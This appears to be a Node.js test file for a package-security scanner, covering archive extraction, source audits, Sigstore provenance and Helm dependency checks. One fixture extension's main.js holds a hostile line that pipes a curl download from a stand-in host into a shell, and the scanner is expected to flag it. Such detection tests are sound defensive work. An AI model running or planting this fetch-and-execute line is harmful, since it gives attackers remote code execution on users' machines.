"use strict";

const assert = require("node:assert/strict");
const fs = require("node:fs");
const os = require("node:os");
const path = require("node:path");
const test = require("node:test");
const { crc32 } = require("../src/distribution/archive");
const { componentSha256, scanDistributionTarget } = require("../src/distribution/pipeline");
const { verifyDistributionReceipt } = require("../src/distribution/receipt");

function storedZip(entries) {
  const local = [];
  const central = [];
  let offset = 0;
  for (const [filename, value] of Object.entries(entries)) {
    const name = Buffer.from(filename);
    const content = Buffer.from(value);
    const checksum = crc32(content);
    const header = Buffer.alloc(30);
    header.writeUInt32LE(0x04034b50, 0); header.writeUInt16LE(20, 4); header.writeUInt16LE(0x0800, 6);
    header.writeUInt32LE(checksum, 14); header.writeUInt32LE(content.length, 18); header.writeUInt32LE(content.length, 22); header.writeUInt16LE(name.length, 26);
    local.push(header, name, content);
    const record = Buffer.alloc(46);
    record.writeUInt32LE(0x02014b50, 0); record.writeUInt16LE((3 << 8) | 20, 4); record.writeUInt16LE(20, 6); record.writeUInt16LE(0x0800, 8);
    record.writeUInt32LE(checksum, 16); record.writeUInt32LE(content.length, 20); record.writeUInt32LE(content.length, 24); record.writeUInt16LE(name.length, 28);
    record.writeUInt32LE((0o100600 << 16) >>> 0, 38); record.writeUInt32LE(offset, 42);
    central.push(record, name);
    offset += header.length + name.length + content.length;
  }
  const body = Buffer.concat(local);
  const directory = Buffer.concat(central);
  const end = Buffer.alloc(22);
  end.writeUInt32LE(0x06054b50, 0); end.writeUInt16LE(Object.keys(entries).length, 8); end.writeUInt16LE(Object.keys(entries).length, 10);
  end.writeUInt32LE(directory.length, 12); end.writeUInt32LE(body.length, 16);
  return Buffer.concat([body, directory, end]);
}

function oneFileTar(filename, value) {
  const content = Buffer.from(value);
  const header = Buffer.alloc(512);
  header.write(filename, 0, 100, "utf8");
  for (const [offset, length, number] of [[100, 8, 0o600], [108, 8, 0], [116, 8, 0], [124, 12, content.length], [136, 12, 0]]) {
    header.write(number.toString(8).padStart(length - 1, "0") + "\0", offset, length, "ascii");
  }
  header.fill(0x20, 148, 156); header[156] = "0".charCodeAt(0);
  header.write("ustar\0", 257, 6, "ascii"); header.write("00", 263, 2, "ascii");
  let checksum = 0; for (const byte of header) checksum += byte;
  header.write(checksum.toString(8).padStart(6, "0"), 148, 6, "ascii"); header[154] = 0; header[155] = 0x20;
  return Buffer.concat([header, content, Buffer.alloc((512 - content.length % 512) % 512), Buffer.alloc(1024)]);
}

function fixture(t) {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), "pkgxray-pipeline-"));
  t.after(() => fs.rmSync(root, { recursive: true, force: true }));
  return root;
}

function writeSigstoreFixture(root, archiveBytes, digest = null) {
  const sha256 = digest || require("node:crypto").createHash("sha256").update(archiveBytes).digest("hex");
  const statement = { _type: "https://in-toto.io/Statement/v1", predicateType: "https://slsa.dev/provenance/v1",
    subject: [{ name: "extension.zip", digest: { sha256 } }], predicate: {} };
  const bundle = { mediaType: "application/vnd.dev.sigstore.bundle+json;version=0.3", verificationMaterial: {},
    dsseEnvelope: { payloadType: "application/vnd.in-toto+json",
      payload: Buffer.from(JSON.stringify(statement)).toString("base64"), signatures: [{ sig: "fixture" }] } };
  const bundleFile = path.join(root, `bundle-${sha256.slice(0, 8)}.json`);
  fs.writeFileSync(bundleFile, JSON.stringify(bundle));
  return bundleFile;
}

function fakeSigstore(root) {
  const modulePath = path.join(root, "sigstore");
  fs.mkdirSync(modulePath);
  fs.writeFileSync(path.join(modulePath, "package.json"), JSON.stringify({ name: "sigstore", version: "3.0.0" }));
  fs.writeFileSync(path.join(modulePath, "index.js"), "exports.verify=async()=>{};");
  return modulePath;
}

test("archive pipeline extracts, audits declared code and emits a byte-bound non-authorizing receipt", async t => {
  const root = fixture(t);
  const archive = path.join(root, "malicious.vsix");
  fs.writeFileSync(archive, storedZip({
    "extension/package.json": JSON.stringify({ name: "fixture", version: "1.0.0", engines: { vscode: "*" }, main: "main.js" }),
    "extension/main.js": "require('child_process').exec('curl https://example.invalid/payload | sh')"
  }));
  const result = await scanDistributionTarget(archive);
  assert.notEqual(result.verdict, "safe");
  assert.equal(result.descriptors.metadata.detectedTypes.includes("vsix"), true);
  assert.equal(result.sourceAudit.coverage.complete, true);
  assert.ok(result.sourceAudit.files.includes("extension/main.js"));
  assert.match(result.artifact.sha256, /^[a-f0-9]{64}$/);
  assert.equal(result.receipt.authorization.install, false);
  assert.equal(result.receipt.checks.extraction, "completed");
  assert.equal(result.extraction.destination, undefined);
  assert.equal((await verifyDistributionReceipt(archive, result.receipt, { result })).valid, true);
});

test("directory pipeline preserves descriptor and source coverage without inventing an artifact receipt", async t => {
  const root = fixture(t);
  fs.writeFileSync(path.join(root, "manifest.json"), JSON.stringify({ manifest_version: 3, name: "fixture", version: "1", background: { service_worker: "worker.js" } }));
  fs.writeFileSync(path.join(root, "worker.js"), "console.log('benign')");
  const result = await scanDistributionTarget(root);
  assert.equal(result.artifact, null);
  assert.equal(result.receipt, undefined);
  assert.equal(result.sourceAudit.coverage.complete, true);
  assert.equal(result.descriptors.metadata.detectedTypes[0], "browser");
});

test("recursive pipeline dispatch is opt-in and excludes permissions", async t => {
  const root = fixture(t);
  fs.writeFileSync(path.join(root, "manifest.json"), JSON.stringify({ manifest_version: 3, name: "fixture", version: "1", permissions: ["nativeMessaging"] }));
  const result = await scanDistributionTarget(root, { recursive: true, sourceAudit: false });
  assert.equal(result.recursive.coverage.discoveredComponents, 1);
  assert.equal(result.recursive.coverage.ignoredMetadataComponents, 1);
  assert.equal(result.recursive.nodes.length, 0);
  assert.equal(result.recursive.coverage.complete, true);
  assert.equal(result.recursive.findings.length, 0);
});

test("recursive archive acquisition requires an immutable SHA-256 component binding", () => {
  assert.equal(componentSha256({ digest: `sha256:${"a".repeat(64)}` }), "a".repeat(64));
  assert.equal(componentSha256({ digests: [`sha256:${"B".repeat(64)}`] }), "b".repeat(64));
  assert.equal(componentSha256({ reference: "https://example.test/mutable.zip" }), null);
});

test("archive pipeline binds an operator-pinned Sigstore identity into provenance and receipt", async t => {
  const root = fixture(t);
  const archiveBytes = storedZip({
    "manifest.json": JSON.stringify({ manifest_version: 3, name: "fixture", version: "1", permissions: ["storage"] })
  });
  const archive = path.join(root, "extension.zip");
  fs.writeFileSync(archive, archiveBytes);
  const policy = {
    sigstoreBundle: writeSigstoreFixture(root, archiveBytes),
    sigstoreSubject: "extension.zip",
    certificateIdentity: "https://github.com/example/project/.github/workflows/release.yml@refs/tags/v1",
    certificateIssuer: "https://token.actions.githubusercontent.com",
    sigstoreModulePath: fakeSigstore(root),
    provenanceBackendRunner: async () => ({ status: "verified" })
  };
  const result = await scanDistributionTarget(archive, policy);
  assert.equal(result.provenance.status, "verified");
  assert.equal(result.provenance.artifactBound, true);
  assert.equal(result.receipt.checks.provenance, "completed");
  assert.equal(result.receipt.provenance.certificateIdentity, policy.certificateIdentity);

  const invalid = await scanDistributionTarget(archive, {
    ...policy,
    sigstoreBundle: writeSigstoreFixture(root, archiveBytes, "0".repeat(64))
  });
  assert.equal(invalid.provenance.status, "invalid");
  assert.equal(invalid.verdict, "block");
  assert.equal(invalid.receipt.checks.provenance, "failed");
});

test("gzip TAR pipeline reaches Helm descriptor analysis and remains artifact-bound", async t => {
  const root = fixture(t);
  const archive = path.join(root, "chart.tgz");
  fs.writeFileSync(archive, require("node:zlib").gzipSync(oneFileTar("chart/Chart.yaml", [
    "apiVersion: v2", "name: fixture", "dependencies:", "  - name: redis", "    version: ^19.0.0",
    "    repository: https://charts.example.invalid", ""
  ].join("\n"))));
  const result = await scanDistributionTarget(archive, { sourceAudit: false });
  assert.equal(result.extraction.container.type, "tar+gzip");
  assert.ok(result.descriptors.metadata.detectedTypes.includes("infrastructure"));
  assert.ok(result.components.some(component => component.kind === "helm-dependency"));
  assert.ok(result.findings.some(finding => finding.category === "mutable-reference"));
  assert.equal(result.receipt.artifact.sha256, result.artifact.sha256);
});
